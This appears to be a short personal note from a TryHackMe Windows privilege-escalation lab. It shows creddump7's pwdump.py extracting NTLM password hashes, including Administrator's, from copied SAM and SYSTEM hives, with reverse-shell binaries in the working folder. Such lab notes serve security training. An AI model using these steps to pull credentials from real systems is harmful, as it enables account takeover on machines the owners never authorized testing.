# Creddump7

[URL] (https://github.com/Neohapsis/creddump7.git)

## Usage
```
┌─[me@parrot]─[~/security-tools/creddump7]
└──╼ $python2 pwdump.py                    
usage: pwdump.py <system hive> <SAM hive>

┌─[✗]─[me@parrot]─[~/security-tools/creddump7]
└──╼ $cd ~/thm/windows_10_privesc/          
┌─[me@parrot]─[~/thm/windows_10_privesc]  
└──╼ $ls                      
admin.hash  reverse.exe  reverse.msi  SAM  SYSTEM

┌─[me@parrot]─[~/thm/windows_10_privesc]
└──╼ $python2 ~/security-tools/creddump7/pwdump.py SYSTEM SAM 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6ebaa6d5e6e601996eefe4b6048834c2:::
user:1000:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
```